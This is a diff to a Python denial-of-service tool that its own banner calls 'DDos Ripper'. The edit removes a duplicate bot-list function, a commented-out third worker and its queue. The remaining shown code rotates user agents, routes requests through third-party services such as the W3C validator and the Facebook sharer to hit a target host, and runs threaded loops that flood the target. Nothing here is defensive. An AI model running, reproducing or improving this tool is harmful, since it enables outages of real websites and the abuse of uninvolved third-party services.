@@ -38,24 +38,12 @@ def user_agent():
 	uagent.append("Mozilla / 5.0(X11;Fedora;Linuxx86_64;rv:81.0) Gecko / 20100101Firefox / 81.0")
 	return(uagent)
 
-
-
 def my_bots():
 	global bots
 	bots=[]
 	bots.append("http://validator.w3.org/check?uri=")
 	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
 	return(bots)
-
-
-def my_bots2():
-	global bots
-	bots=[]
-	bots.append("http://validator.w3.org/check?uri=")
-	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
-	return(bots)
-
-
 
 def bot_rippering(url):
 	try:
@@ -107,12 +95,6 @@ def dos2():
 		item=w.get()
 		bot_rippering(random.choice(bots)+"http://"+host)
 		w.task_done()
-
-#def dos3():
-  #  while True:
-  #      item = e.get()
-  #      bot_rippering(random.choice(bots)+"http://"+host)
-  #      e.task_done()
 
 def usage():
 	print (''' \033[0;95mDDos Ripper 
@@ -166,10 +148,9 @@ global data
 headers = open("headers.txt", "r")
 data = headers.read()
 headers.close()
-#task queue are q,w,e
+#task queue are q,w
 q = Queue()
 w = Queue()
-e = Queue()
 
 
 if __name__ == '__main__':
@@ -196,9 +177,6 @@ if __name__ == '__main__':
 			t2 = threading.Thread(target=dos2)
 			t2.daemon = True  # if thread is exist, it dies
 			t2.start()
-		#	t3 = threading/Thread(target=dos3)
-		#	t3.daemon = True # if thread is exist, it dies
-		#	t3.start()
 		start = time.time()
 		#tasking
 		item = 0
@@ -209,7 +187,5 @@ if __name__ == '__main__':
 			item = item + 1
 			q.put(item)
 			w.put(item)
-			e.put(item)
 		q.join()
 	w.join()
-e.join()
